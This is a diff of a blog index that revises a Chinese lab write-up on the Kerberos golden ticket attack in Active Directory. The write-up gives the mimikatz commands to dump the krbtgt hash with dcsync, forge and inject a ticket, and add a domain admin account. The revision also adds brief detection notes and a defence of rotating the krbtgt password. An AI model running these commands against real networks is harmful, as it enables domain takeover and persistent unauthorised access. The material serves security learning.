@@ -2126,7 +2126,7 @@
       </tags>
   </entry>
   <entry>
-    <title>域渗透之金票</title>
+    <title>域渗透提权维权之金票</title>
     <url>/2021/07/05/%E9%87%91%E7%A5%A8/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>域内常用的两种攻击包括黄金票据Golden ticket和白银票据SILVER TICKET，本篇博客先来介绍一下金票</p>
 <h1 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h1><table>
@@ -2139,42 +2139,30 @@
 </thead>
 <tbody><tr>
 <td align="center">DC域控</td>
-<td align="center">192.168.221.135</td>
-<td align="center">2008</td>
-</tr>
-<tr>
-<td align="center">DM</td>
-<td align="center">192.168.221.133</td>
-<td align="center">2003</td>
-</tr>
-<tr>
-<td align="center">DM</td>
-<td align="center">192.168.221.132</td>
-<td align="center">xp</td>
+<td align="center">10.xx.xx.xx</td>
+<td align="center">2012</td>
 </tr>
 </tbody></table>
-<h1 id="票据生成条件："><a href="#票据生成条件：" class="headerlink" title="票据生成条件："></a>票据生成条件：</h1><ol>
+<h1 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h1><h1 id="票据生成步骤："><a href="#票据生成步骤：" class="headerlink" title="票据生成步骤："></a>票据生成步骤：</h1><ol>
 <li><p><strong>域名</strong></p>
-<p>swanq.com</p>
-</li>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure></li>
 <li><p><strong>域的SID值</strong>     </p>
-<p>SID：s-1-5-21-1591593742-2040670928-2738819432</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">lsadump::dcsyns /domain:wlaq.com /user:krbtgt</span><br></pre></td></tr></table></figure>
+
 <p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/2.png"></p>
 <blockquote>
 <p>SID：500代表管理员</p>
 </blockquote>
 </li>
 <li><p><strong>域的KRBTGT账户NTLM-HASH</strong></p>
-</li>
-<li><p><strong>伪造用户名，可以是任意用户名</strong></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user ceshi swanq000!<span class="selector-tag">@</span><span class="comment"># /add /domain</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/1.png"></p>
-<p>新建用户可以是在域管或者域控上，只要有权限创建域内账户即可。</p>
-</li>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">lsadump::dcsyns /domain:wlaq.com /user:krbtgt</span><br></pre></td></tr></table></figure></li>
+<li><p><strong>伪造任意域管账号</strong></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user test swanq000!<span class="selector-tag">@</span><span class="comment"># /add /domain</span></span><br></pre></td></tr></table></figure></li>
 </ol>
-<h1 id="获取krbtgt的HTLM-hash"><a href="#获取krbtgt的HTLM-hash" class="headerlink" title="获取krbtgt的HTLM-hash"></a>获取krbtgt的HTLM-hash</h1><p>mimikatz获取krbtgt的NTLMhash</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:swanq.com /user:krbtgt</span><br></pre></td></tr></table></figure>
+<h1 id="0x01-获取域SID及krbtgt的HTLM-hash"><a href="#0x01-获取域SID及krbtgt的HTLM-hash" class="headerlink" title="0x01.获取域SID及krbtgt的HTLM-hash"></a>0x01.获取域SID及krbtgt的HTLM-hash</h1><p>先在DC上新建一个实验用户swanq,此攻击都是基于在域控机子上的普通域内账户.即普通域内账户没有创建域管账户的权限或提升普通用户权限，而利用黄金票据可以做到</p>
+<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/1.jpg"></p>
+<p>mimikatz获取域控SID及krbtgt的NTLMhash.可在域控或在登陆过域控账户的域成员上获取</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:wlaq.com /user:krbtgt</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/3.png"></p>
 <blockquote>
@@ -2188,18 +2176,43 @@
 </li>
 </ul>
 </blockquote>
-<h1 id="伪造票据"><a href="#伪造票据" class="headerlink" title="伪造票据"></a>伪造票据</h1><p>得到krbtgt hash后，用mimikatz的Kerberos::golden功能生成金票golden.kiribi伪造TGT</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:swanq.com /sid:s<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-1591593742</span><span class="literal">-2040670928</span><span class="literal">-2738819432</span> /krbtgt:<span class="number">6</span>d34590dfef0bd5d9e0d391140b0aab /ticket:golden.kiribi</span><br></pre></td></tr></table></figure>
+<h1 id="0x02-伪造票据"><a href="#0x02-伪造票据" class="headerlink" title="0x02.伪造票据"></a>0x02.伪造票据</h1><p>在非域控的机子上，需要先清除本地票据缓存，但因此swanq用户刚创建且并未有其他服务需要票据，所以此处为空，不需要kerberos::purge   </p>
+<p>得到krbtgt hash后，用mimikatz的Kerberos::golden功能生成金票ticket.kiribi伪造TGT</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">kerberos::golden /user:test /domain:wlaq.com /sid:&#123;s<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-xxx</span>&#125;  /krbtgt:&#123;ntlm<span class="literal">-hash</span>&#125; /ticket:ticket.kiribi</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/4.png"></p>
-<h1 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h1><p>清空本地票据缓存，导入伪造的票据</p>
-<p>kerberos::purge   #清除本地票据缓存</p>
-<p>kerberos::list      #查看本地保存的票据，观察client name</p>
-<p>Kerberos::ptt golden kiribi   #导入伪造的黄金票据<br>kerberos::list     #查看本地保存的票据，观察client name是否变为我们票据中的用户名</p>
-<p>参考：</p>
+<h1 id="0x03-票据利用"><a href="#0x03-票据利用" class="headerlink" title="0x03.票据利用"></a>0x03.票据利用</h1><p>查看本地保存的票据,确认无误</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/8.png"></p>
+<p>将伪造的黄金票据导入内存</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Kerberos::ptt ticket.kiribi</span><br></pre></td></tr></table></figure>
+
+<p>新建域管账户</p>
+<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/9.png"></p>
+<p>入DC检查</p>
+<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/10.png"></p>
+<p>不过此域管账户并没有本地登录权限，还是需要加入administrator组</p>
+<p><img src="/2021/07/05/%E9%87%91%E7%A5%A8/11.png"></p>
+<h1 id="0x04-检测及清理"><a href="#0x04-检测及清理" class="headerlink" title="0x04.检测及清理"></a>0x04.检测及清理</h1><p>eventvwr打开windows事件查看器</p>
 <ol>
-<li>域控是最高级，域管是任何被域控加入域管的域成员</li>
+<li>防御：定期更新krbtgt密码使原始密码失效</li>
 <li></li>
+</ol>
+<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><ol>
+<li>mimikatz在win2003及以下导入黄金票据报错</li>
+<li>事件4624-登录</li>
+<li>事件4672-特殊登录：SYSTEM（本地系统）帐户的每次登录都会触发此事件</li>
+</ol>
+<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
+<li>chz-大佬竟在我身边：<a href="https://zhuanlan.zhihu.com/p/385465988">https://zhuanlan.zhihu.com/p/385465988</a></li>
+<li>域控是最高级，域管是任何被域控加入域管的域成员</li>
+<li>新建域用户之后，需要给域用户配置隶属于管理员的权限，才允许本地登录：<a href="https://blog.csdn.net/weixin_43760829/article/details/89437363">https://blog.csdn.net/weixin_43760829/article/details/89437363</a></li>
+<li>远程桌面命令行指令：mstsc(Microsoft Terminal Server Connection)</li>
+<li>需要熟悉Active Directory 用户和计算机、组策略管理</li>
+<li><a href="https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%83%EF%BC%89PTT-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/#%E8%8E%B7%E5%8F%96krbtgt%E7%94%A8%E6%88%B7%E5%93%88%E5%B8%8C">https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%83%EF%BC%89PTT-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/#%E8%8E%B7%E5%8F%96krbtgt%E7%94%A8%E6%88%B7%E5%93%88%E5%B8%8C</a></li>
+<li>存在错误但为主要参考：<a href="https://www.jianshu.com/p/4936da524040">https://www.jianshu.com/p/4936da524040</a></li>
+<li>mimikatz详情：<a href="https://wooyun.js.org/drops/Mimikatz%20%E9%9D%9E%E5%AE%98%E6%96%B9%E6%8C%87%E5%8D%97%E5%92%8C%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83_Part3.html">https://wooyun.js.org/drops/Mimikatz%20%E9%9D%9E%E5%AE%98%E6%96%B9%E6%8C%87%E5%8D%97%E5%92%8C%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83_Part3.html</a></li>
 </ol>
 ]]></content>
       <tags>
